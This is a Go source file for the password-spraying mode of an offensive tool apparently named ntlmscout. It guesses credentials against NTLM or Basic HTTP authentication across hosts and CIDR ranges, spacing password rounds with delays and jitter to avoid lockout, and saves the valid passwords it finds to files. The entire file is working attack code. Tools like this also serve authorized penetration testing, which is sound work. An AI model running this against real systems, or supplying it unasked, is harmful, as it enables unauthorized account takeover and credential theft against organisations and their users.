package spray

import (
	"bufio"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/netip"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/mubix/ntlmscout/internal/netx"
)

// Options carries the resolved CLI configuration for spray mode.
type Options struct {
	Targets   []string
	InputList string
	Users     []string
	Passwords []string
	Domain    string
	Auth      string // "ntlm" or "basic"
	SprayPath string
	Delay     float64 // seconds between password rounds
	Jitter    float64 // random 0..N seconds per attempt
	Threads   int
	Timeout   time.Duration
	Output    string
	JSON      string
	Verbose   bool
	Net       *netx.Config
}

// Runner holds shared spray state.
type Runner struct {
	cfg     *netx.Config
	auth    string
	timeout time.Duration
	jitter  float64
}

type endpoint struct {
	host   string
	port   int
	useTLS bool
	path   string
	domain string
}

type attemptRec struct {
	Host     string `json:"host"`
	Endpoint string `json:"endpoint"`
	Domain   string `json:"domain"`
	User     string `json:"user"`
	Password string `json:"password"`
	Status   int    `json:"status"`
	Result   string `json:"result"`
}

func classify(st int) string {
	switch {
	case st == 200 || st == 301 || st == 302:
		return "valid"
	case st == 403:
		return "valid" // authenticated, access restricted -- creds are good
	case st == 401 || st == 407:
		return "invalid"
	default:
		return "error" // None / 400 / 5xx -> could not reliably test
	}
}

// Run executes spray mode and returns a process exit code.
func Run(opts *Options) int {
	users := loadList(opts.Users)
	passwords := loadList(opts.Passwords)
	if len(users) == 0 || len(passwords) == 0 {
		fmt.Fprintln(os.Stderr, "[!] spray mode requires users (-u) and passwords (-p)")
		return 2
	}
	targets := append([]string{}, opts.Targets...)
	if opts.InputList != "" {
		targets = append(targets, readLines(opts.InputList)...)
	}
	targets = expandTargets(targets)
	if len(targets) == 0 {
		fmt.Fprintln(os.Stderr, "[!] no targets given")
		return 2
	}

	r := &Runner{cfg: opts.Net, auth: opts.Auth, timeout: opts.Timeout, jitter: opts.Jitter}

	fmt.Fprintf(os.Stderr, "[*] Resolving spray endpoints across %d target(s)...\n", len(targets))
	var endpoints []endpoint
	for _, t := range targets {
		host, port, useTLS, path := targetParts(t)
		forced := path
		if forced == "" {
			forced = opts.SprayPath
		}
		ep, dom := r.pickEndpoint(host, port, useTLS, forced)
		if ep == "" {
			fmt.Fprintf(os.Stderr, "[-] %s: no %s-capable endpoint found; skipping\n", host, strings.ToUpper(opts.Auth))
			continue
		}
		domain := opts.Domain
		if domain == "" {
			domain = dom
		}
		endpoints = append(endpoints, endpoint{host, port, useTLS, ep, domain})
		extra := ""
		if domain != "" {
			extra = "  (domain " + domain + ")"
		}
		fmt.Fprintf(os.Stderr, "[+] %s -> spray %s via %s%s\n", host, strings.ToUpper(opts.Auth), ep, extra)
	}
	if len(endpoints) == 0 {
		fmt.Fprintln(os.Stderr, "[!] No sprayable endpoints resolved; nothing to do.")
		return 1
	}

	rounds := len(passwords)
	fmt.Fprintf(os.Stderr,
		"\n[!] SPRAY: %d user(s) x %d password(s) = %d round(s), <=1 attempt/account/round.\n"+
			"    auth=%s  delay=%gs between rounds  jitter=%gs  threads=%d\n"+
			"    Password-spray ordering keeps each account to one try per round to\n"+
			"    avoid lockout -- confirm the target's lockout policy first.\n\n",
		len(users), len(passwords), rounds, opts.Auth, opts.Delay, opts.Jitter, opts.Threads)

	found := map[[2]string]string{} // {host,user} -> password
	var attempts []attemptRec
	tally := map[string]int{"valid": 0, "invalid": 0, "error": 0}
	uc := useColorStdout()
	var mu sync.Mutex

	attempt := func(ep endpoint, user, password string) int {
		if opts.Jitter > 0 {
			time.Sleep(time.Duration(rand.Float64() * opts.Jitter * float64(time.Second)))
		}
		sendDom, sendUser, disp := identity(user, ep.domain)
		if opts.Auth == "basic" {
			return r.sprayBasic(ep.host, ep.port, ep.useTLS, ep.path, disp, password)
		}
		return r.sprayNTLM(ep.host, ep.port, ep.useTLS, ep.path, sendDom, sendUser, password)
	}

	for pi, password := range passwords {
		if pi > 0 && opts.Delay > 0 {
			fmt.Fprintf(os.Stderr, "[*] round %d/%d done; waiting %gs before next password...\n", pi, rounds, opts.Delay)
			time.Sleep(time.Duration(opts.Delay * float64(time.Second)))
		}
		round := map[string]int{"valid": 0, "invalid": 0, "error": 0}
		sem := make(chan struct{}, opts.Threads)
		var wg sync.WaitGroup
		for _, ep := range endpoints {
			for _, user := range users {
				mu.Lock()
				_, done := found[[2]string{ep.host, user}]
				mu.Unlock()
				if done {
					continue
				}
				wg.Add(1)
				sem <- struct{}{}
				go func(ep endpoint, user string) {
					defer wg.Done()
					defer func() { <-sem }()
					st := attempt(ep, user, password)
					verdict := classify(st)
					_, _, disp := identity(user, ep.domain)
					mu.Lock()
					tally[verdict]++
					round[verdict]++
					attempts = append(attempts, attemptRec{ep.host, ep.path, ep.domain, user, password, st, verdict})
					if verdict == "valid" {
						found[[2]string{ep.host, user}] = password
						fmt.Println(colorize("[VALID]   ", cGreen, uc) +
							fmt.Sprintf("%s  %s : %s   (HTTP %d, %s)", ep.host, disp, password, st, ep.path))
					} else if opts.Verbose && verdict == "invalid" {
						fmt.Println(colorize("[invalid] ", cRed, uc) +
							fmt.Sprintf("%s  %s : %s   (HTTP %d)", ep.host, disp, password, st))
					} else if opts.Verbose && verdict == "error" {
						fmt.Println(colorize("[error]   ", cYellow, uc) +
							fmt.Sprintf("%s  %s : %s   (no clean response - not tested)", ep.host, disp, password))
					}
					mu.Unlock()
				}(ep, user)
			}
		}
		wg.Wait()
		fmt.Fprintf(os.Stderr, "[*] round %d/%d (password %q): valid=%d invalid=%d inconclusive=%d\n",
			pi+1, rounds, password, round["valid"], round["invalid"], round["error"])
	}

	printSpraySummary(endpoints, found, tally)
	writeSprayOutputs(opts, found, tally, attempts)
	return 0
}

func printSpraySummary(endpoints []endpoint, found map[[2]string]string, tally map[string]int) {
	total := tally["valid"] + tally["invalid"] + tally["error"]
	fmt.Fprintln(os.Stderr, "\n"+strings.Repeat("=", 64))
	fmt.Fprintln(os.Stderr, "  SPRAY RESULTS")
	fmt.Fprintln(os.Stderr, strings.Repeat("-", 64))
	fmt.Fprintf(os.Stderr, "  attempts made     : %d\n", total)
	fmt.Fprintf(os.Stderr, "  VALID credentials : %d\n", tally["valid"])
	fmt.Fprintf(os.Stderr, "  invalid (rejected): %d\n", tally["invalid"])
	fmt.Fprintf(os.Stderr, "  inconclusive/error: %d   (endpoint gave no clean 200/401 oracle)\n", tally["error"])
	domOf := map[string]string{}
	for _, e := range endpoints {
		domOf[e.host] = e.domain
	}
	switch {
	case tally["valid"] > 0:
		fmt.Fprintln(os.Stderr, "\n  Valid credentials found:")
		for k, pw := range found {
			who := k[1]
			if d := domOf[k[0]]; d != "" {
				who = d + "\\" + k[1]
			}
			fmt.Fprintf(os.Stderr, "    %s  %s : %s\n", k[0], who, pw)
		}
	case tally["invalid"] > 0 && tally["error"] == 0:
		fmt.Fprintln(os.Stderr, "\n  No valid credentials -- every account cleanly rejected (tested OK).")
	case tally["error"] > 0 && tally["invalid"] == 0:
		fmt.Fprintln(os.Stderr, "\n  INCONCLUSIVE -- no endpoint returned a clean 200/401 oracle, so\n"+
			"  these creds were NOT actually validated. Try --auth basic, a\n"+
			"  different --spray-path, or check the endpoint manually.")
	default:
		fmt.Fprintf(os.Stderr, "\n  No valid credentials found (%d rejected, %d inconclusive).\n", tally["invalid"], tally["error"])
	}
	fmt.Fprintln(os.Stderr, strings.Repeat("=", 64))
}

func writeSprayOutputs(opts *Options, found map[[2]string]string, tally map[string]int, attempts []attemptRec) {
	if opts.Output != "" {
		if f, err := secureCreate(opts.Output); err == nil {
			for k, pw := range found {
				fmt.Fprintf(f, "%s\t%s\t%s\n", k[0], k[1], pw)
			}
			f.Close()
			fmt.Fprintf(os.Stderr, "[*] %d valid credential(s) written to %s\n", len(found), opts.Output)
		}
	}
	if opts.JSON != "" {
		if f, err := secureCreate(opts.JSON); err == nil {
			var valid []map[string]string
			for k, pw := range found {
				valid = append(valid, map[string]string{"host": k[0], "user": k[1], "password": pw})
			}
			enc := json.NewEncoder(f)
			enc.SetIndent("", "  ")
			_ = enc.Encode(map[string]interface{}{"summary": tally, "valid": valid, "attempts": attempts})
			f.Close()
			fmt.Fprintf(os.Stderr, "[*] Full attempt log written to %s\n", opts.JSON)
		}
	}
}

// ---- helpers ----

func loadList(values []string) []string {
	var out []string
	for _, v := range values {
		if fi, err := os.Stat(v); err == nil && !fi.IsDir() {
			out = append(out, readLines(v)...)
		} else {
			out = append(out, v)
		}
	}
	seen := map[string]bool{}
	var uniq []string
	for _, x := range out {
		if !seen[x] {
			seen[x] = true
			uniq = append(uniq, x)
		}
	}
	return uniq
}

func readLines(path string) []string {
	f, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer f.Close()
	var out []string
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 1024*1024), 1024*1024)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			out = append(out, line)
		}
	}
	return out
}

func expandTargets(raw []string) []string {
	var out []string
	for _, t := range raw {
		if !strings.Contains(t, "://") && strings.Contains(t, "/") && !strings.HasPrefix(t, "[") {
			if p, err := netip.ParsePrefix(t); err == nil {
				p = p.Masked()
				bits := p.Addr().BitLen() - p.Bits()
				if bits > 16 {
					fmt.Fprintf(os.Stderr, "[!] skipping %s -- range too large\n", t)
					continue
				}
				total := 1 << uint(bits)
				addr := p.Addr()
				var hosts []string
				for i := 0; i < total && addr.IsValid(); i++ {
					hosts = append(hosts, addr.String())
					addr = addr.Next()
				}
				if p.Addr().Is4() && len(hosts) > 2 {
					hosts = hosts[1 : len(hosts)-1]
				}
				out = append(out, hosts...)
				continue
			}
		}
		out = append(out, t)
	}
	return out
}

// ---- color (spray writes creds to stdout) ----

const (
	cRed    = "\033[31m"
	cGreen  = "\033[32m"
	cYellow = "\033[33m"
	cReset  = "\033[0m"
)

func colorize(s, code string, enable bool) string {
	if enable {
		return code + s + cReset
	}
	return s
}

func useColorStdout() bool {
	fi, err := os.Stdout.Stat()
	if err != nil {
		return false
	}
	return fi.Mode()&os.ModeCharDevice != 0
}

func secureCreate(path string) (*os.File, error) {
	return os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0o600)
}
